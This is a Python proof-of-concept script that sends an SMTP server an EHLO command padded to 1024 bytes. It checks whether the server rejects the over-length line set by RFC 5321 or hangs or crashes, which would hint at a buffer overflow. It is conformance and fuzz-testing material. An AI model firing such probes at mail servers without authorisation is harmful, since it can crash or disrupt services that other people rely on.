# Generated by RFC Analyzer from protocol specification analysis.

#!/usr/bin/env python3
import socket
import sys
import time

def send_oversized_smtp_command(target_ip, target_port, timeout=5):
    """
    Connects to an SMTP server and sends an oversized EHLO command to test
    for buffer overflow or improper handling of command line length limits.
    """
    # Create a TCP socket
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(timeout)
    
    try:
        print(f"[*] Connecting to {target_ip}:{target_port}...")
        sock.connect((target_ip, target_port))
        
        # Read initial SMTP banner
        banner = sock.recv(1024).decode('utf-8', errors='ignore')
        print(f"[+] Server banner: {banner.strip()}")
        
        # Craft an oversized EHLO command
        # RFC 5321 Section 4.5.3.1.4 limits command lines to 512 octets.
        # We create a payload significantly larger than this limit.
        oversized_payload = "A" * 1024  # 1024 bytes, well over the 512 limit
        command = f"EHLO {oversized_payload}\r\n"
        
        print(f"[*] Sending oversized EHLO command (length: {len(command)} bytes)...")
        sock.sendall(command.encode('utf-8'))
        
        # Wait for server response
        try:
            response = sock.recv(4096).decode('utf-8', errors='ignore')
            print(f"[+] Server response: {response.strip()}")
            
            # Analyze response
            if "500" in response or "501" in response:
                print("[!] Server correctly rejected the oversized command (RFC compliant).")
            else:
                print("[!] Server did not reject the oversized command. Potential vulnerability.")
                
        except socket.timeout:
            print("[!] Server did not respond within the timeout period. Possible crash or hang.")
            
    except ConnectionRefusedError:
        print(f"[!] Connection refused by {target_ip}:{target_port}")
    except socket.timeout:
        print(f"[!] Connection to {target_ip}:{target_port} timed out.")
    except Exception as e:
        print(f"[!] An error occurred: {e}")
    finally:
        sock.close()

if __name__ == "__main__":
    if len(sys.argv) != 3:
        print("Usage: python3 poc_smtp_command_line_oversized_payload.py <target_ip> <target_port>")
        sys.exit(1)
        
    target_ip = sys.argv[1]
    target_port = int(sys.argv[2])
    
    send_oversized_smtp_command(target_ip, target_port)